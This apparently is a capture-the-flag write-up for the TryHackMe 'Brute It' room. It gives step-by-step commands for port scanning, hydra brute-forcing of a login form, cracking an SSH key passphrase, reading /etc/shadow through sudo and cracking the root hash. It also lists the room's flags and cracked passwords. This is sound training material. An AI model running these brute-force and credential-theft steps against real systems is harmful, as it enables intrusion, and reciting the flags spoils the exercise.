---
description: https://tryhackme.com/room/bruteit
---

# Brute It

![](../../.gitbook/assets/10.10.113.210.png)

## Task 2 Reconnaissance

#### Search for open ports using nmap. How many ports are open?

```bash
nmap -n -sV -sC 10.10.113.210
```

![](<../../.gitbook/assets/Screenshot from 2022-03-16 18-08-42.png>)

{% hint style="success" %}
`2`
{% endhint %}

#### What version of SSH is running?

{% hint style="success" %}
`OpenSSH 7.6p1`
{% endhint %}

#### What version of Apache is running?

{% hint style="success" %}
`2.4.29`
{% endhint %}

#### Which Linux distribution is running?

{% hint style="success" %}
`Ubuntu`
{% endhint %}

#### Search for hidden directories on web server. What is the hidden directory?

```bash
gobuster dir -u http://10.10.113.210 \
             -w /usr/share/dirb/wordlists/common.txt \
             -t128
```

![](<../../.gitbook/assets/Screenshot from 2022-03-16 18-16-00.png>)

{% hint style="success" %}
`/admin`
{% endhint %}

## Task 3 Getting a shell

#### What is the user:password of the admin panel?

![](<../../.gitbook/assets/Screenshot from 2022-03-16 18-18-32.png>) ![](<../../.gitbook/assets/Screenshot from 2022-03-16 18-18-43.png>)

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
'http-post-form://10.10.113.210/admin/:user=^USER^&pass=^PASS^:invalid' -t64
```

![](<../../.gitbook/assets/Screenshot from 2022-03-16 18-20-47.png>)

{% hint style="success" %}
`admin:xavier`
{% endhint %}

#### Crack the RSA key you found. What is John's RSA Private Key passphrase?

![](<../../.gitbook/assets/Screenshot from 2022-03-16 18-25-40.png>)

```bash
wget http://10.10.113.210/admin/panel/id_rsa
ssh2john id_rsa > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-03-16 18-29-14.png>)

{% hint style="success" %}
`rockinroll`
{% endhint %}

#### user.txt

```bash
chmod 400 id_rsa
ssh -i id_rsa john@10.10.113.210
find / -type f -name user.txt 2>/dev/null
cat user.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-03-16 18-35-38.png>)

{% hint style="success" %}
`THM{a_password_is_not_a_barrier}`
{% endhint %}

#### Web flag

{% hint style="success" %}
`THM{brut3_f0rce_is_e4sy}`
{% endhint %}

## Task 4 Privilege Escalation

#### Find a form to escalate your privileges. What is the root's password?

```bash
sudo -l
sudo /bin/cat /etc/passwd | grep root > passwd
sudo /bin/cat /etc/shadow | grep root > shadow
```

![](<../../.gitbook/assets/Screenshot from 2022-03-16 18-53-19.png>)

```bash
scp -i id_rsa john@10.10.113.210:/home/john/{passwd,shadow} .
unshadow passwd shadow > crackme
john --wordlist=/usr/share/wordlists/rockyou.txt crackme
```

![](<../../.gitbook/assets/Screenshot from 2022-03-16 18-58-19.png>)

{% hint style="success" %}
`football`
{% endhint %}

#### root.txt

```bash
su - root
cat root.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-03-16 19-01-58.png>)

{% hint style="success" %}
`THM{pr1v1l3g3_3sc4l4t10n}`
{% endhint %}

## Xmind

{% file src="../../.gitbook/assets/10.10.113.210.xmind" %}
